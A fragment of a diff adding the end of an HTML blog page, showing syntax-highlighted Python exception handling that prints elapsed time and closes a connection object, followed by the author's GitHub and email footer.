+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Elapsed time: </span><span class="si">{</span><span class="n">elapsed_time</span><span class="si">:</span><span class="p">.</span><span class="mi">2</span><span class="n">f</span><span class="si">}</span><span class="s"> seconds</span><span class="sh">"</span><span class="p">)</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">EOFError:</span><span class="sh">"</span><span class="p">,</span> <span class="n">ea</span><span class="p">)</span>
+        <span class="n">t</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+        <span class="k">continue</span>
+
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">ea</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error:</span><span class="sh">"</span><span class="p">,</span> <span class="n">ea</span><span class="p">)</span>
+        <span class="n">t</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+        <span class="k">continue</span>
+
+</code></pre></div></div>
+</div><footer class="flex flex-col centered mb-3 grey5 text-m mt-12">
+  <div class="flex align-center ">
+    <span>Github</span>
+    <hr class="no-margin dotted-hor ml-1">
+    <a  class="ml-1 orange underline hover:text-red transition-colors" href="https://github.com/MatusMandzak">@MatusMandzak</a>
+  </div>
+  <div class="flex align-center ">
+    <span>Email</span>
+    <hr class="no-margin dotted-hor ml-1">
+    <p class="ml-1 orange">mandzak.matus&lt;at&gt;proton.me</p>
+  </div>
+</footer>
+</div>
+  </body>
+</html>
